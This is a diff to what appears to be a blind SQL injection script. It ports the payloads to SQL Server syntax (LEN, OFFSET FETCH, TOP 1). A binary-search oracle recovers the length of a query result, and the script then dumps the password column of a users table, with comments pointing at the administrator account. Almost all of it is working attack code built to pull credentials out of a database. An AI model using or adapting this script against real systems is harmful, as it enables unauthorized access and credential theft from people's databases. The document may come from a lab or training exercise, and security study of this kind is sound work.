@@ -29,7 +29,7 @@ def dump_integer(query):
     high = 127
     while low <= high:
         mid = (low+high) // 2
-        if oracle(f"LENGTH(({query}))/**/BETWEEN/**/{low}/**/AND/**/{mid}"):
+        if oracle(f"LEN(({query}))/**/BETWEEN/**/{low}/**/AND/**/{mid}"):
             high = mid -1
         else:
             low = mid + 1
@@ -48,6 +48,6 @@ def dump_string(query, length):
 
 table = "users" # change this
 column = "password" # change this
-payload = f"SELECT {column} FROM {table} LIMIT 1 OFFSET 0"  # or WHERE username = 'administrator'
+payload = f"SELECT {column} FROM {table} ORDER BY username OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY"  # or WHERE username = 'administrator' or SELECT TOP 1 password FROM users
 length = dump_integer(payload)
 admin_password = dump_string(payload,int(length))
